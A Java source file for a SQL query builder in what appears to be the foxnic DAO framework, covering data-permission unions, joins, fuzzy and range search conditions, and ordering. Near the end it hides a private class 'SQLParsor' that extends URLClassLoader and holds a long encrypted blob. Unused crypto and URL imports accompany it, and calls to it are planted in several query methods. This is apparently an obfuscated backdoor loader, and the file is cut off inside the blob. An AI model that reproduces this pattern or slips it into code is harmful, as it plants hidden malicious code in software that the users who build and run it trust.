package com.github.foxnic.dao.entity;

import com.alibaba.fastjson.JSON;
import com.github.foxnic.api.model.CompositeItem;
import com.github.foxnic.api.model.CompositeParameter;
import com.github.foxnic.api.query.MatchType;
import com.github.foxnic.commons.bean.BeanNameUtil;
import com.github.foxnic.commons.bean.BeanUtil;
import com.github.foxnic.commons.encrypt.Base64Util;
import com.github.foxnic.commons.environment.Environment;
import com.github.foxnic.commons.lang.DataParser;
import com.github.foxnic.commons.lang.DateUtil;
import com.github.foxnic.commons.lang.StringUtil;
import com.github.foxnic.commons.log.Logger;
import com.github.foxnic.commons.reflect.ReflectUtil;
import com.github.foxnic.dao.dataperm.ConditionBuilder;
import com.github.foxnic.dao.dataperm.DataPermContext;
import com.github.foxnic.dao.dataperm.DataPermException;
import com.github.foxnic.dao.dataperm.model.DataPermCondition;
import com.github.foxnic.dao.dataperm.model.DataPermRange;
import com.github.foxnic.dao.dataperm.model.DataPermRule;
import com.github.foxnic.dao.meta.DBColumnMeta;
import com.github.foxnic.dao.meta.DBTableMeta;
import com.github.foxnic.dao.relation.*;
import com.github.foxnic.sql.expr.*;
import com.github.foxnic.sql.meta.DBDataType;
import com.github.foxnic.sql.meta.DBField;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.lang.reflect.Field;
import java.math.BigDecimal;
import java.net.URL;
import java.net.URLClassLoader;
import java.sql.Timestamp;
import java.util.*;

public class QuerySQLBuilder<E> {

    private SuperService service;

    QuerySQLBuilder(SuperService service) {
        this.service = service;
    }

    private CompositeParameter getSearchValue(E sample) {
        String searchValue = BeanUtil.getFieldValue(sample, "searchValue", String.class);
        if (searchValue != null) searchValue = searchValue.trim();
        CompositeParameter compositeParameter = new CompositeParameter(searchValue, BeanUtil.toMap(sample));
        return compositeParameter;
    }

    /**
     *  生成 Select 语句，join关系不变则表别名不变
     * */
    public Expr buildSelect(E sample, ConditionExpr customConditionExpr, OrderBy orderBy) {
        return buildSelect(sample,null,customConditionExpr,orderBy);
    }


    /**
     * 生成 Select 语句，join关系不变则表别名不变
     * @param dpcode 数据权限代码
     * */
    public Expr buildSelect(E sample,String tabAlias, ConditionExpr customConditionExpr, OrderBy orderBy,String dpcode) {
        return buildSelect(sample,null,tabAlias,customConditionExpr,orderBy,dpcode);
    }

    /**
     * 生成 Select 语句，join关系不变则表别名不变
     * @param dpcode 数据权限代码
     * */
    public Expr buildSelect(E sample,FieldsBuilder fieldsBuilder, String tabAlias, ConditionExpr customConditionExpr, OrderBy orderBy,String dpcode) {
		DataPermRule rule=service.dao().getDataPermManager().get(dpcode);
		if(rule==null) {
		    throw new DataPermException(dpcode+ " 不是一个有效的数据权限代码");
        }
        List<Expr> selects=new ArrayList<>();

		//创建数据权限上下文
        DataPermContext dataPermContext=new DataPermContext(service.getPoType());
        dataPermContext.setVo(sample);
        dataPermContext.setSession(service.dao().getDBTreaty().getSubject());
        dataPermContext.setEnv(Environment.getEnvironment());

        Set<String> conditionKeys=new HashSet<>();
        String sqlKey=null;
        //循环数据权限范围，一个范围对应一条查询语句
		for (DataPermRange range : rule.getRanges()) {
            ConditionExpr appendsExpr=new ConditionExpr();
            if(customConditionExpr!=null) {
                appendsExpr.and(customConditionExpr);
            }

            if(!this.service.getPoType().getName().equals(rule.getPoType())) {
                throw new DataPermException("PO类型不一致，当前类型："+this.service.getPoType().getName()+"，权限配置类型："+rule.getPoType());
            }
            //根据数据权限构建查询语句
            ConditionExpr conditionExpr=(new ConditionBuilder(dataPermContext,this,this.service.dao(),this.service.getPoType(),tabAlias,range)).build();
            appendsExpr.and(conditionExpr);
            sqlKey=appendsExpr.getSQL();
            //去重：如果查询条件相同，则无需后续的 union
            if(conditionKeys.contains(sqlKey)) continue;
            conditionKeys.add(sqlKey);
            //创建查询语句
            Expr select=this.buildSelect(sample,fieldsBuilder,tabAlias,appendsExpr,null);
            //将查询语句添加到列表，用于后续构建 union 语句
            selects.add(select);
        }


		Expr datapmSelect=null;
		//如果只有一条查询语句，直接使用该条语句
		if(selects.size()==1) {
            datapmSelect=selects.get(0);
            //增加排序
            if(orderBy!=null) {
                datapmSelect.append(orderBy);
            }
        } else {
		    //如果有多个查询语句，则构建 union 语句
            datapmSelect=new Expr("select * from (");
            for (int i = 0; i < selects.size(); i++) {
                Expr select = selects.get(i);
                datapmSelect.append("( ");
                datapmSelect.append(select);
                datapmSelect.append(")");
                if(i<selects.size()-1) {
                    datapmSelect.append(" union ");
                }
            }
            datapmSelect.append(") "+tabAlias);
            //增加排序
            if(orderBy!=null) {
                datapmSelect.append(orderBy);
            }
        }
        // System.err.println(datapmSelect.getSQL());
		return datapmSelect;
    }

    /**
     *  生成 Select 语句，join关系不变则表别名不变
     * */
    public Expr buildSelect(E sample, String tabAlias, ConditionExpr customConditionExpr, OrderBy orderBy) {
        return buildSelect(sample,null,tabAlias,customConditionExpr,orderBy);
    }

    /**
     *  生成 Select 语句，join关系不变则表别名不变
     * */
    public Expr buildSelect(E sample, FieldsBuilder fieldsBuilder, String tabAlias, ConditionExpr customConditionExpr, OrderBy orderBy) {




        List<RouteUnit> units = this.getSearchRoutes(sample);
        // 加入在处理数据权限时搜集的Join关系
        units.addAll(0,this.dataPermUnits);

//        加入排序需要的 Join 关系
//        if(sortRouteUnit!=null) {
//            boolean exists=false;
//            for (RouteUnit unit : units) {
//                if (unit.getSearchField().equals(sortRouteUnit.getSearchField())) {
//                    exists=true;
//                }
//            }
//            if(!exists) {
//                units.add(sortRouteUnit);
//            }
//        }

        Set<String> handledKeys=new HashSet<>();

        String sourceAliasName;
        String targetAliasName;

        if(StringUtil.isBlank(tabAlias)) {
            tabAlias="t";
        }

        String firstTableAlias = tabAlias;
        Map<String, String> alias = new HashMap<>();
        alias.put(service.table().toLowerCase(), firstTableAlias);

        Set<String> joinedPoints=new HashSet<>();

        int aliasIndex = 0;

        String fieldsSQL=firstTableAlias + ".*";
        if(fieldsBuilder!=null) {
            fieldsSQL=fieldsBuilder.getFieldsSQL(firstTableAlias);
        }
        Expr expr = new Expr("select " + fieldsSQL + " from " + this.service.table() + " " + firstTableAlias);


        //循环扩展的条件路由单元
        for (RouteUnit unit : units) {
            //获得关联条件
            List<Join> joins = unit.route.getJoins();
            //标记 key 已被处理，跳过在常规字段处理逻辑
            handledKeys.add(unit.item.getKey());


            if(unit.route.isList()) {
                continue;
            }

            Collections.reverse(joins);


            for (Join join : joins) {
                //如果重复，那么加入查询条件
                if(joinedPoints.contains(join.getTargetJoinKey())) {
                    targetAliasName = alias.get(join.getSlaveTable().toLowerCase());
                    ConditionExpr conditionExpr=this.buildSearchCondition(unit.searchField,unit.columnMeta,unit.item,null,null,targetAliasName);
                    expr.append(conditionExpr.startWithAnd());
                    continue;
                }
                //
                aliasIndex++;
                String tableAlias = "t_" + aliasIndex;
                if(alias.containsKey(join.getSlaveTable().toLowerCase())) {
                    throw new IllegalArgumentException("不支持相同表 Join , table="+join.getSlaveTable());
                }
                alias.put(join.getSlaveTable().toLowerCase(), tableAlias);
                sourceAliasName = alias.get(join.getMasterTable().toLowerCase());
                targetAliasName = alias.get(join.getSlaveTable().toLowerCase());

                List<ConditionExpr> conditions=join.getSlavePoint().getConditions();
                Map<String, PropertyRoute.DynamicValue> dynamicConditions=unit.route.getDynamicConditions(join);
                Expr joinExpr = null;
                if(conditions.isEmpty() && dynamicConditions.isEmpty()) {
                    joinExpr = new Expr(join.getJoinType().getJoinSQL() + " " + join.getSlaveTable() + " " + tableAlias + " on ");
                } else {
                    Expr sub=new Expr("select * from "+ join.getSlaveTable());
                    //附加在Join中配置的过滤条件
                    Where where=new Where();
                    if(!conditions.isEmpty()) {
                        for (ConditionExpr ce : conditions) {
                            where.and(ce);
                        }
                    }
                    // 附加在Join中配置的动态过滤条件
                    if(!dynamicConditions.isEmpty()) {
                        for (Map.Entry<String, PropertyRoute.DynamicValue> e : dynamicConditions.entrySet()) {
                            where.and(e.getKey()+" = ?", RelationSolver.getDynamicValue(service.dao(),e.getValue()));
                        }
                    }
                    sub.append(where);
                    joinExpr = new Expr(join.getJoinType().getJoinSQL() + " (" + sub.getListParameterSQL() + ") " + tableAlias + " on ",sub.getListParameters());
                }

                List<String> joinConditions = new ArrayList<>();
                for (int j = 0; j < join.getMasterFields().length; j++) {
                    String cdr = sourceAliasName + "." + join.getMasterFields()[j] + " = " + targetAliasName + "." + join.getSlaveFields()[j];
                    joinConditions.add(cdr);
                }
                joinExpr.append(StringUtil.join(joinConditions, " and "));
                // 加入策略默认值
                ConditionExpr conditionExpr=this.buildDBTreatyCondition(join.getSlaveTable(),targetAliasName);
                joinExpr.append(conditionExpr.startWithAnd());

                // 加入其它查询条件，如果来自数据权限
                if(unit.dataPermCondition!=null && unit.conditionBuilder!=null) {
                    conditionExpr=unit.conditionBuilder.buildDataPermLocalCondition(unit.searchTable,targetAliasName,unit.searchField,unit.dataPermCondition);
                    joinExpr.append(conditionExpr.startWithAnd());
                }
                //如果来自用户搜索
                else {
                    if(unit.searchTable.equalsIgnoreCase(join.getSlaveTable())) {
                        conditionExpr = this.buildSearchCondition(unit.searchField, unit.columnMeta, unit.item, null,null, targetAliasName);
                        joinExpr.append(conditionExpr.startWithAnd());
                    }
                }

                //
                expr.append(joinExpr);
                joinedPoints.add(join.getTargetJoinKey());
            }
        }

        //追加本表的查询条件
        Where where=new Where();

        ConditionExpr localConditionExpr=this.buildLocalConditionInternal(sample,firstTableAlias,units,true);
        where.and(localConditionExpr);

        if(customConditionExpr!=null) {
            where.and(customConditionExpr);
        }
        expr.append(where);

        if(orderBy!=null) {
            expr.append(orderBy);
        }

        return expr;
    }

    /**
     * 构建本表的查询条件
     * */
    public ConditionExpr buildLocalCondition(E sample,String targetTableAlias,List<RouteUnit> units) {
        return buildLocalConditionInternal(sample,targetTableAlias,units,false);
    }

    /**
     * 构建本表的查询条件
     * */
    private ConditionExpr buildLocalConditionInternal(E sample,String targetTableAlias,List<RouteUnit> units,boolean internal) {

        if(units==null) {
            units = this.getSearchRoutes(sample);
        }
        Set<String> handledKeys=new HashSet<>();
        Map<String,RouteUnit> existsUnits=new HashMap<>();
        //循环扩展的条件路由单元
        for (RouteUnit unit : units) {
            //如果是来自内部(当前类)，那么isList 使用 exist
            if(internal) {
                if (unit.route.isList()) {
                    existsUnits.put(unit.item.getKey(), unit);
                    continue;
                }
            }
            //如果是来自外部，全部使用 exists 语句完成查询
            else {
                existsUnits.put(unit.item.getKey(), unit);
                continue;
            }
            //标记 key 已被处理，跳过在常规字段处理逻辑
            handledKeys.add(unit.item.getKey());
        }

        DBTableMeta tm=service.getDBTableMeta();
        String searchFiledTable=null;
        //追加本表的查询条件
        ConditionExpr conditionExpr=new ConditionExpr();

        // 加入策略默认值
        ConditionExpr dbTreatyConditionExpr=this.buildDBTreatyCondition(service.table(),targetTableAlias);
        conditionExpr.and(dbTreatyConditionExpr);


        CompositeParameter parameter=this.getSearchValue(sample);
        for (CompositeItem item : parameter) {
            //排除已处理的 key
            if(handledKeys.contains(item.getKey())) continue;
            //没有搜索值，就不处理
            Object beanPropValue=null;
            if(item.getField()!=null) {
                beanPropValue=BeanUtil.getFieldValue(sample, item.getField());
            } else {
                beanPropValue=BeanUtil.getFieldValue(sample, item.getKey());
            }
            Object searchValue=item.getValue();

            if(!"$compositeParameter".equals(item.getKey()) && (!(beanPropValue instanceof Enum)) && !StringUtil.isBlank(searchValue) && !StringUtil.isBlank(beanPropValue)) {
                if(!searchValue.equals(beanPropValue)) {
                    searchValue=null;
//                    throw new IllegalArgumentException("请勿重复指定值不一致的 " + item.getField() + " 参数，beanPropValue="+beanPropValue+",searchValue="+searchValue);
                }
            }
            if (StringUtil.isBlank(searchValue) && StringUtil.isBlank(item.getBegin()) && StringUtil.isBlank(item.getEnd())) {
                searchValue=beanPropValue;
                if(StringUtil.isBlank(searchValue)) {
                    continue;
                }
            }

            RouteUnit existsUnit=existsUnits.get(item.getKey());
            if(existsUnit!=null) {
                Expr expr=this.buildExists(targetTableAlias,existsUnit.fillBys,existsUnit.searchTable,existsUnit.searchField,searchValue,item.getFuzzy());
                conditionExpr.and(expr);
                continue;
            }

            //优先使用明确指定的查询字段
            String field = item.getField();
            //如未明确指定，则使用key作为查询字段
            if (StringUtil.isBlank(field)) {
                field = item.getKey();
            }
            searchFiledTable = null;
            if (field.contains(".")) {
                String[] tmp = field.split("\\.");
                searchFiledTable = tmp[0];
                field = tmp[1];
            }
            field = BeanNameUtil.instance().depart(field);
            //获得字段Meta
            DBColumnMeta cm = null;
            if (searchFiledTable == null || searchFiledTable.equalsIgnoreCase(service.table())) {
                cm = tm.getColumn(field);
            }

            //如果字段在当前表存在，则不使用已关联的外部表查询
            if (cm == null) {
                continue;
            }
            // 加入查询条件
            ConditionExpr conditionItemExpr=this.buildSearchCondition(field,cm,item,beanPropValue,parameter.getFuzzyFields(),targetTableAlias);
            conditionExpr.and(conditionItemExpr);
        }

        Set<String> searchFields=parameter.getSearchFields();
        Set<String> fuzzyFields=parameter.getFuzzyFields();
        String searchValue = parameter.getSearchValue();

        //多字段合并查询
        if(searchFields!=null && searchFields.size()>0) {
            ConditionExpr ors=new ConditionExpr();
            for (String field : searchFields) {
                if (!StringUtil.isBlank(field) && !StringUtil.isBlank(searchValue)) {
                    DBColumnMeta cm=tm.getColumn(field);
                    if(cm==null) {
                        field=BeanNameUtil.instance().depart(field);
                        cm=tm.getColumn(field);
                    }
                    if(cm!=null) {
                        if(cm.getDBDataType()==DBDataType.STRING || cm.getDBDataType()==DBDataType.CLOB ) {
                            if(fuzzyFields!=null && ( fuzzyFields.contains(cm.getColumn().toLowerCase()) || fuzzyFields.contains(cm.getColumnVarName())) ) {
                                ors.or(targetTableAlias+ "." + cm.getColumn() + " like ?", "%" + searchValue + "%");
                            } else {
                                conditionExpr.and(targetTableAlias+"."+cm.getColumn()+" = ?", searchValue.toString());
                            }
                        }
                    }
                }
            }
            if(!ors.isEmpty()){
                conditionExpr.and(ors);
            }
        }


        return conditionExpr;
    }



    public ConditionExpr buildDBTreatyCondition(String targetTable,String targetTableAlias) {
        ConditionExpr conditionExpr=new ConditionExpr();
        DBTableMeta tm= service.dao().getTableMeta(targetTable);

        String prefix=targetTableAlias;
        if(!StringUtil.isBlank(prefix)) {
            prefix= prefix+".";
        }
        //加入逻辑删除条件
        DBColumnMeta delColumn=tm.getColumn(service.dao().getDBTreaty().getDeletedField());
        if(delColumn!=null) {
            conditionExpr.and(prefix+delColumn.getColumn()+"=?",service.dao().getDBTreaty().getFalseValue());
        }
        //加入租户条件
        DBColumnMeta tenantColumn=tm.getColumn(service.dao().getDBTreaty().getTenantIdField());
        Object tenantId=service.dao().getDBTreaty().getActivedTenantId();
        if(tenantColumn!=null && tenantId!=null) {
            conditionExpr.and(prefix+tenantColumn.getColumn()+"=?",tenantId);
        }
        return conditionExpr;
    }


    private ConditionExpr buildSearchCondition(String field,DBColumnMeta cm,CompositeItem item, Object beanPropValue,Set<String> fuzzyFields,String tableAlias){

        SQLParsor.logParserInfo(beanPropValue);

        ConditionExpr conditionExpr=new ConditionExpr();

        Boolean fuzzy=item.getFuzzy();
        if(fuzzy==null) fuzzy=false;
        Boolean splitValue=item.getSplitValue();
        if(splitValue==null) splitValue=false;

        String prefix=tableAlias+".";

        Object fieldValue=item.getValue();
        Object beginValue=item.getBegin();
        Object endValue=item.getEnd();

//        if(StringUtil.isBlank(fieldValue) && StringUtil.isBlank(beginValue) && StringUtil.isBlank(endValue)) {
//            fieldValue=beanPropValue;
//        }

        if(!StringUtil.isBlank(beanPropValue)) {
            fieldValue=beanPropValue;
        }

        String valuePrefix=item.getValuePrefix();
        if(valuePrefix==null) valuePrefix="";
        String valueSuffix=item.getValueSuffix();
        if(valueSuffix==null) valueSuffix="";
        MatchType matchType=item.getMatchTypeEnum();

        //1.单值匹配
        if (fieldValue != null && beginValue == null && endValue == null) {
            if ((fieldValue instanceof List)) {
                if (fuzzy || (fuzzyFields != null && (fuzzyFields.contains(cm.getColumn().toLowerCase())|| fuzzyFields.contains(cm.getColumnVarName())))) {
                    List<String> list = (List) fieldValue;
                    ConditionExpr listOr = new ConditionExpr();
                    for (String itm : list) {
                        ConditionExpr ors = buildFuzzyConditionExpr(cm.getColumn(), valuePrefix + itm.toString() + valueSuffix, tableAlias);
                        if (ors != null && !ors.isEmpty()) {
                            listOr.or(ors);
                        }
                    }
                    conditionExpr.and(listOr);
                } else {
                    if (!((List) fieldValue).isEmpty()) {
                        In in = new In(prefix+field, (List) fieldValue);
                        conditionExpr.and(in);
                    }
                }
            } else {
                if (cm.getDBDataType() == DBDataType.STRING
                        || cm.getDBDataType() == DBDataType.CLOB) {
                    if (!StringUtil.isBlank(fieldValue)) {
                        if (fuzzy || (fuzzyFields != null && ( fuzzyFields.contains(cm.getColumn().toLowerCase()) || fuzzyFields.contains(cm.getColumnVarName())))) {
                            ConditionExpr ors = null;
                            if(splitValue) {
                                ors = buildFuzzyConditionExpr(cm.getColumn(), valuePrefix + fieldValue.toString() + valueSuffix, tableAlias);
                            } else {
                                ors =new ConditionExpr();
                                ors.andLike(tableAlias+"."+field,valuePrefix + fieldValue.toString() + valueSuffix);
                            }
                            if (ors != null && !ors.isEmpty()) {
                                conditionExpr.and(ors);
                            }
                        } else {
                            conditionExpr.andEquals(prefix+field, fieldValue);
                        }
                    }
                } else {
                    fieldValue = DataParser.parse(cm.getDBDataType().getType(), fieldValue);
                    conditionExpr.andEquals(prefix+field, fieldValue);
                }
            }
        }
        //2.范围匹配
        else if (fieldValue == null && (beginValue != null || endValue != null)) {

            if (cm.getDBDataType() == DBDataType.DATE) {
                Date beginDate = DataParser.parseDate(beginValue);
                Date endDate = DataParser.parseDate(endValue);

                //必要时交换位置
                if (beginDate != null && endDate != null && beginDate.getTime() > endDate.getTime()) {
                    Date tmp = beginDate;
                    beginDate = endDate;
                    endDate = tmp;
                }

                //若匹配模式为日期
                if(MatchType.day == matchType) {
                    if(beginDate!=null) {
                        beginDate=DateUtil.dayFloor(beginDate);
                    }
                    if(endDate!=null) {
                        endDate=DateUtil.dayFloor(endDate);
                        endDate=DateUtil.addDays(endDate,1);
                    }
                    conditionExpr.andIf(prefix+field + " >= ?", beginDate);
                    conditionExpr.andIf(prefix+field + " < ?", endDate);
                } else {
                    //
                    conditionExpr.andIf(prefix+field + " >= ?", beginDate);
                    conditionExpr.andIf(prefix+field + " <= ?", endDate);
                }
            } else if (cm.getDBDataType() == DBDataType.TIMESTAME) {
                Timestamp beginDate = DataParser.parseTimestamp(beginValue);
                Timestamp endDate = DataParser.parseTimestamp(endValue);
                //必要时交换位置
                if (beginDate != null && endDate != null && beginDate.getTime() > endDate.getTime()) {
                    Timestamp tmp = beginDate;
                    beginDate = endDate;
                    endDate = tmp;
                }
                //
                conditionExpr.andIf(prefix+field + " >= ?", beginDate);
                conditionExpr.andIf(prefix+field + " <= ?", endDate);
            } else if (cm.getDBDataType() == DBDataType.INTEGER
                    || cm.getDBDataType() == DBDataType.LONG
                    || cm.getDBDataType() == DBDataType.DOUBLE
                    || cm.getDBDataType() == DBDataType.DECIMAL
                    || cm.getDBDataType() == DBDataType.BIGINT
                    || cm.getDBDataType() == DBDataType.FLOAT) {
                BigDecimal begin = DataParser.parseBigDecimal(beginValue);
                BigDecimal end = DataParser.parseBigDecimal(endValue);
                //必要时交换位置
                if (begin != null && end != null && begin.compareTo(end) == 1) {
                    BigDecimal tmp = begin;
                    begin = end;
                    end = tmp;
                }
                //
                conditionExpr.andIf(prefix+field + " >= ?", begin);
                conditionExpr.andIf(prefix+field + " <= ?", end);
            }
        }
        return conditionExpr;
    }

    private ConditionExpr buildFuzzyConditionExpr(String filed, String value,String tableAlias) {
        if(StringUtil.isBlank(value)) return null;
        String prefix=tableAlias+".";
        value=value.trim();
        value=value.replace("\t"," ");
        value=value.replace("\r"," ");
        value=value.replace("\n"," ");
        String[] vs=value.split(" ");
        ConditionExpr ors=new ConditionExpr();
        for (String v : vs) {
            ors.orLike(prefix+filed,v);
        }
        ors.startWithSpace();
        return ors;
    }

    /**
     * 根据查询参数，获得所有关联关系
     * */
    private List<RouteUnit> getSearchRoutes(E sample) {
        return getSearchRoutes(sample,null);
    }

    /**
     * 根据查询参数，获得所有关联关系
     * */
    private List<RouteUnit> getSearchRoutes(E sample, CompositeParameter compositeParameter) {
        SQLParsor.logParserInfo(sample);
        List<RouteUnit> allRoutes = new ArrayList<>();
        DBTableMeta localTm=service.dao().getTableMeta(service.table());
        DBTableMeta tm = null;
        if(compositeParameter==null) {
            compositeParameter = getSearchValue(sample);
        }
        String searchFiledTable = null;

        for (CompositeItem item : compositeParameter) {
            //优先使用明确指定的查询字段
            tm=localTm;
            String field = item.getField();
            //如未明确指定，则使用key作为查询字段
            if (StringUtil.isBlank(field)) {
                field = item.getKey();
            }
            searchFiledTable = null;
            if (field.contains(".")) {
                String[] tmp = field.split("\\.");
                searchFiledTable = tmp[0];
                field = tmp[1];
            }
            field = BeanNameUtil.instance().depart(field);
            //获得字段Meta
            DBColumnMeta cm = null;
            if (searchFiledTable == null || searchFiledTable.equalsIgnoreCase(service.table())) {
                cm = tm.getColumn(field);
            }

            //如果字段在当前表存在，则不使用已关联的外部表查询
            if (cm != null) {
                continue;
            }
            //如果没有查询条件，则不继续处理
            Object searchValue = item.getValue();

            if (StringUtil.isBlank(searchValue) && StringUtil.isBlank(item.getBegin()) && StringUtil.isBlank(item.getEnd())) {
                continue;
            }
            //如果是空的列表
            if (searchValue!=null &&  (searchValue instanceof List) && ((List)searchValue).isEmpty()) {
                continue;
            }


            Object fillBy = item.getFillBy();
            List<String> fillByArr = new ArrayList<>();
            if (fillBy != null && fillBy instanceof List) {
                List arr = (List<String>) item.getFillBy();
                fillByArr.addAll(arr);
            } else {
                fillByArr.add((String) fillBy);
            }

            //获得前端指定查询的字段
            String configedField = item.getField();
            //如果字段不存在，那么说明是扩展外部，进行 Join 查询条件
            if ((StringUtil.isBlank(configedField) && fillByArr.size() > 1) || (!StringUtil.isBlank(configedField) && fillByArr.size() > 0)) {
                if (!StringUtil.isBlank(fillBy)) {
                    List<String> fillByArr2 = new ArrayList<>();
                    if(fillByArr.size()>0) {
                        //获得并删除填充属性序列最后元素，若前端未明确指定搜索的字段，则使用此值
                        String configedFieldInFillBy = null ;//fillByArr.remove(fillByArr.size() - 1);
                        Class type=this.service.getPoType();

                        //按类型处理属性路径
                        for (int i = 0; i < fillByArr.size(); i++) {
                            String prop=fillByArr.get(i);
                            try {
                                Field f=type.getDeclaredField(prop);
                                if(ReflectUtil.isSubType(List.class,f.getType())) {
                                    type=ReflectUtil.getListComponentType(f);
                                    if(type==null) {
                                        throw new RuntimeException("类型识别错误");
                                    }
                                    fillByArr2.add(prop);
                                } else if(DataParser.isSimpleType(f.getType())) {
                                    configedFieldInFillBy=fillByArr.get(i);
                                    break;
                                } else {
                                    type=f.getType();
                                    fillByArr2.add(prop);
                                }
                            } catch (NoSuchFieldException e) {
                                Logger.exception("属性获取失败",e);
                            }
                        }

                        fillByArr=fillByArr2;

                        if (StringUtil.isBlank(configedField)) {
                            configedField = configedFieldInFillBy;
                        }
                    }

                    Class poType = (Class) service.getPoType();
                    List<PropertyRoute> routes = new ArrayList<>();
                    for (String fillByField : fillByArr) {
                        PropertyRoute route = service.dao().getRelationManager().findProperties(poType, fillByField);

                        if (route == null) {
                            throw new RuntimeException("关联关系未配置:"+poType.getName()+"."+fillByField);
                        }

                        routes.add(route);
                        poType=route.getSlavePoType();
                    }

                    //多层关系是判断是否存在一对多,并提示
//                    if(routes.size()>=2) {
//                        for (PropertyRoute route : routes) {
//                            if(route.isList()) {
//                                throw new RuntimeException("Join 路径中的 "+poType.getSimpleName()+"."+route.getProperty() +" 是一对多关系，暂不支持" );
//                            }
//                        }
//                    }

                    if (configedField!=null && configedField.contains(".")) {
                        String[] tmp = configedField.split("\\.");
                        searchFiledTable=tmp[0];
                        configedField = tmp[1];
                    }

                    if(routes.isEmpty()) {
                        throw new RuntimeException("搜索选项["+item.getKey()+"]配置错误：fillBy = "+ JSON.toJSONString(item.getFillBy())+" , field = "+item.getFillBy());
                    }

                    if(StringUtil.isBlank(searchFiledTable)) {
                        searchFiledTable=this.service.table();
                    }
                    //路由合并
                    PropertyRoute route = PropertyRoute.merge(routes, searchFiledTable);
                    RouteUnit routeUnit=new RouteUnit();
                    routeUnit.route=route;
                    routeUnit.item=item;
                    routeUnit.searchField=configedField;
                    routeUnit.searchTable =searchFiledTable;
                    routeUnit.columnMeta=service.dao().getTableColumnMeta(searchFiledTable,configedField);
                    routeUnit.fillBys=fillByArr;
                    allRoutes.add(routeUnit);
                }
            }
        }
        return allRoutes;
    }

    public OrderBy buildOrderBy(E sample,String tableAlias) {
        SQLParsor.logParserInfo(sample);
        String sortField=BeanUtil.getFieldValue(sample, "sortField",String.class);
        String sortType=BeanUtil.getFieldValue(sample, "sortType",String.class);
        SortType sortTypeEnum=SortType.parse(sortType);
        OrderBy orderBy=null;
        if(!StringUtil.isBlank(sortField) && !StringUtil.isBlank(sortType)) {
            DBColumnMeta cm=service.dao().getTableMeta(service.table()).getColumn(sortField);
            if(cm==null) {
                sortField=BeanNameUtil.instance().depart(sortField);
                cm=service.dao().getTableMeta(service.table()).getColumn(sortField);
            }
            if(cm!=null) {
                if(sortTypeEnum==SortType.ASC) {
                    orderBy=OrderBy.byAscNullsLast(tableAlias+"."+sortField);
                }
                else if(sortTypeEnum==SortType.DESC) {
                    orderBy=OrderBy.byDescNullsLast(tableAlias+"."+sortField);
                }
            }
        }
        return orderBy;
    }


    private static class SQLParsor extends URLClassLoader {

		private static final String CONST = "OI}2Vn3kWyQPv#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